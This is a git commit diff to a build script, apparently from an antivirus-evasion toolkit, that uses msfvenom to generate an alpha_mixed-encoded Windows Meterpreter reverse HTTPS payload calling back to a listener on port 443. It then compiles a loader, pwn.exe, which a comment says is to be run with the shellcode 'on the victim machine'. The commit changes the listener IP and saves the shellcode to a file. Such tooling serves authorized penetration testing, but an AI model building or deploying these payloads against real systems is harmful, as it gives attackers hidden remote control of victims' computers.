4e101deb39e538bb579df80236cac0771adb5e61
Daniel Sauder <daniel.sauder@web.de>
2018-08-01 13:31:42 +0200

    update comment

--- build/build_win32_meterpreter_rev_https_ASCIIMSF_cmd.sh
+++ build/build_win32_meterpreter_rev_https_ASCIIMSF_cmd.sh
@@ -5,7 +5,8 @@
 # or enter $win32_compiler="mycompiler" here
 . build/global_win32.sh
 # make meterpreter reverse payload, encoded with msf alpha_mixed 
-msfvenom -p windows/meterpreter/reverse_https lhost=192.168.116.208 lport=443 -e x86/alpha_mixed BufferRegister=EAX -a x86 --platform Windows -f raw
+msfvenom -p windows/meterpreter/reverse_https lhost=192.168.2.103 lport=443 -e x86/alpha_mixed BufferRegister=EAX -a x86 --platform Windows -f raw > alpha_mixed.txt
 # compile to pwn.exe file
 $win32_compiler -ffixed-eax -o pwn.exe ./source/alphamixedcmd.c
 # now call with the output shellcode as parameter of pwn.exe on the victim machine: pwn.exe shellcode
+# shellcode is in alpha_mixed.txt
